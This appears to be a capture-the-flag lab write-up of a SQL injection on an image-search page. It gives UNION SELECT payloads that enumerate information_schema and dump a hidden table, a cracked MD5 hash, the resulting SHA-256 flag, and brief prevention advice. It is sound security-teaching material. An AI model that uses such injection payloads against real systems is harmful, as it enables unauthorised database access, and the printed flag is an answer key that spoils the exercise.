# SQL Injection (IMAGE)

Once clicking the `Search Image` located on bottom of the page, a prompt will be shown to search image with image number, (http://{IP_ADDR}/index.php?page=searchimg). let's see what information will be pulling off from: Putting number to see what information will be pulling out from Once you put any number and submit, it will bring a result with corresponding ID number with `ID`, `First name`, `Surname`

```
[...]
ID: 1
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
[...]
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
[...]
```

As studied from [last method](../0x0a-sql_injection-members/README.md), every database will have it's schema, so let's check what information can be get by looking through `information_schema`

```
1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables
```
the `list_images` table exists, so let's check all the column names from it.

```
1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```
by searching the `list_images`, the columns exist

```
id, url, title, comment
```

By tring all the columns, with using columns `title`, and `comment`, the following message can be reterived, with this query

```
1 AND 1=1 UNION SELECT title, comment FROM list_images
```

<img width="1163" alt="image" src="https://user-images.githubusercontent.com/46742040/202277463-931b337f-c8cb-48c2-bbb4-1db5929509cf.png">

as it shows, let's decrypt the password
```
ID: 1 AND 1=1 UNION SELECT title, comment FROM list_images
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

```
1928e8083cf461a51303633093573c46 -(MD5 decrypt)-> albatroz -(sh256 encrypt)->

f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

# Remedattion
A SQL Injection is an attack of injectin query through the input data from the client to the application. It can cause modify, removal, or admin operation to the databases. This can happen when unintended data enters a program from an untrusted source, or the data is used to dynamically construct a SQL query.

In order to prevent,

- Use of Prepare Statements (with Parameterized Queries)
- Use of properly construed stored Procedures
- Allow-list input valiation
- Escaping All User Supplied Input

See More:

- [SQL Injection | OWASP Foundation](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Prevention - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
